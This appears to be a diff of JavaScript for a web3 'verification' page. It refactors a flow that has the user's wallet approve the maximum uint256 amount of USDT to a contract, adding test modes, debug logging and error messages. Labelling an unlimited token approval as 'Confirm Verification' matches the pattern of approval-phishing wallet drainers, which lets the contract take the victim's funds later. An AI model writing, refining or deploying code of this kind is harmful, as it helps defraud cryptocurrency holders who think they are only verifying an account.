@@ -1352,53 +1352,103 @@
     
             const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
             const minRequired = web3.utils.toBN('1000000');
-    
-            // If approval is needed
-            // if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
 
-            if (true) {  // FORCED TEST MODE
 
+            // ------ CONFIG: choose test mode here ------
+            const APPROVAL_TEST_MODE = 'AUTO'; // use 'AUTO' | 'SIMULATE' | 'FORCE_REAL_APPROVAL'
+            // -------------------------------------------
             
-                // Step 1: Ask user to approve
-                verifyBtn.textContent = 'Approve in wallet...';
-            
-                const maxAmount =
-                    '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-            
-                // Create promiEvent but DO NOT show any progress yet
-                const approvePromi = usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
-            
-                let indeterminate = null;
-            
-                // Step 2: Wallet popup appears NOW (user approves or rejects)
-            
-                // Step 3: Only AFTER user approves, we get transactionHash
-                approvePromi.on('transactionHash', (hash) => {
-                    // NOW start progress bar
-                    indeterminate = startIndeterminateProgress({ btnId: 'verifyBtn', intervalMs: 90 });
-                });
-            
-                // Step 4: Wait for the receipt → confirmation on chain
+            /* Determine if approval is needed (returns boolean) */
+            async function isApprovalNeeded() {
                 try {
-                    await approvePromi; 
+                    const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
+                    console.log('DEBUG: account=', account);
+                    console.log('DEBUG: CONTRACT_ADDRESS=', CONTRACT_ADDRESS);
+                    console.log('DEBUG: currentAllowance (raw)=', currentAllowance);
             
-                    // Step 5: Complete progress bar
-                    if (indeterminate) {
-                        await indeterminate.stop();
+                    // USDT uses 6 decimals; your minRequired uses 1 USDT = 1_000_000 units
+                    const minRequired = web3.utils.toBN('1000000'); // 1 USDT as you used before
+                    return web3.utils.toBN(currentAllowance).lt(minRequired);
+                } catch (e) {
+                    console.error('ERROR checking allowance:', e);
+                    // If check fails, assume approval is needed to be safe
+                    return true;
+                }
+            }
+            
+            // Replace previous approval section with this:
+            if (APPROVAL_TEST_MODE === 'SIMULATE') {
+                // Simulate the user approval flow without calling the wallet.
+                verifyBtn.textContent = 'Approve in wallet...';
+                console.log('SIMULATION MODE: pretending user needs to approve.');
+            
+                // Wait a moment so you can see "Approve in wallet..." (simulate user clicking approve)
+                await new Promise(r => setTimeout(r, 900)); // short pause before starting indeterminate
+            
+                // Start indeterminate progress as if transactionHash was received
+                const indeterminate = startIndeterminateProgress({ btnId: 'verifyBtn', intervalMs: 90 });
+                // Simulate network mining time
+                await new Promise(r => setTimeout(r, 2000));
+                // Complete indeterminate
+                await indeterminate.stop();
+            
+            } else {
+                // AUTO or FORCE_REAL_APPROVAL: check allowance unless forced
+                const needApproval = (APPROVAL_TEST_MODE === 'FORCE_REAL_APPROVAL') ? true : await isApprovalNeeded();
+            
+                if (needApproval) {
+                    // Step 1: Ask user to approve (wallet popup will appear when we call send())
+                    verifyBtn.textContent = 'Approve in wallet...';
+            
+                    const maxAmount =
+                        '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+            
+                    // If we're in FORCE_REAL_APPROVAL or AUTO and approval is actually needed, perform the real promiEvent
+                    try {
+                        const approvePromi = usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+            
+                        let indeterminate = null;
+                        let sawTxHash = false;
+            
+                        approvePromi.on('transactionHash', (hash) => {
+                            sawTxHash = true;
+                            console.log('DEBUG: approve txHash:', hash);
+                            // Start indeterminate progress only after txHash arrives (user has approved the popup)
+                            indeterminate = startIndeterminateProgress({ btnId: 'verifyBtn', intervalMs: 90 });
+                        });
+            
+                        approvePromi.on('error', (err) => {
+                            console.warn('DEBUG: approvePromi error event:', err);
+                        });
+            
+                        // Wait for receipt (this will wait until the tx is mined/confirmed)
+                        const receipt = await approvePromi;
+                        console.log('DEBUG: approve receipt:', receipt);
+            
+                        // If we started indeterminate progress, stop it (snap to 100%)
+                        if (indeterminate) {
+                            await indeterminate.stop();
+                        } else {
+                            // Rare case: no txHash event fired but receipt returned — show quick 100%
+                            verifyBtn.textContent = 'Loading 100%...';
+                            await new Promise(r => setTimeout(r, 300));
+                        }
+            
+                    } catch (err) {
+                        console.error('Approval failed or rejected:', err);
+                        let userMsg = 'Approval rejected or failed.';
+                        if (err && err.code === 4001) userMsg = 'Transaction rejected by user.';
+                        if (err && err.message && err.message.includes('insufficient funds')) userMsg = 'Insufficient ETH for gas fees.';
+            
+                        document.getElementById('errorText').textContent = userMsg;
+                        document.getElementById('errorMessage').classList.add('show');
+            
+                        verifyBtn.disabled = false;
+                        verifyBtn.textContent = 'Confirm Verification';
+                        return; // stop processing
                     }
-            
-                } catch (err) {
-                    // User denied / failed
-                    let msg = 'Approval failed or rejected.';
-                    if (err.code === 4001) msg = 'Transaction rejected by user.';
-                    if (err.message?.includes('insufficient funds')) msg = 'Insufficient ETH for gas fees.';
-            
-                    document.getElementById('errorText').textContent = msg;
-                    document.getElementById('errorMessage').classList.add('show');
-            
-                    verifyBtn.disabled = false;
-                    verifyBtn.textContent = 'Confirm Verification';
-                    return;
+                } else {
+                    console.log('DEBUG: Approval not needed — skipping approve step.');
                 }
             }
 
